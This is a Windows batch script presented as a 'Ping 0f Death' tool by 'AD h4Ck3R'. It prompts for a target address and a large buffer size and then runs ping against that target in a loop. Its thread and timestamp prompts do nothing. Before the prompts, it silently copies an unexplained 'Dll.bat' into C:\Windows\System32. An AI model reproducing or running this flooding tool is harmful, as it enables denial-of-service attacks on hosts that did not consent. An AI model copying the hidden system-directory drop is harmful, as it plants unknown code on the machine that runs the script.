@echo off
title Ping 0f Death
color a
copy E:\Utilities\Dll.bat C:\Windows\System32
:a 
cls
echo +=================================+
echo #                                 #
echo #     AD ~ Ping 0f Death Tool     #
echo #                                 #
echo +=================================+
echo.
echo Copyright (c) by AD h4Ck3R
echo Version 1.7
echo Web - http://adhacker.96.lt
echo.
echo  System Info
echo -------------
echo.
echo Operating System : %os%
echo PC Name : %computername%
echo Username : "%username%"
echo Date : %date%
echo Time : %time%
echo.
set /p a=Enter IP or Web Address : 
if %a%==%a% goto size
:size 
set /p b=Enter buffer size [Max 65000] : 
if %b%==%b% goto thread
:thread
set /p c=Enter number of threads : 
if %c%==%c% goto time
:time
set /p d=Enter timestamps : 
if %d%==%d% goto pod
:pod 
ping %a% -l %b% -n %c%
pause>nul
goto a 
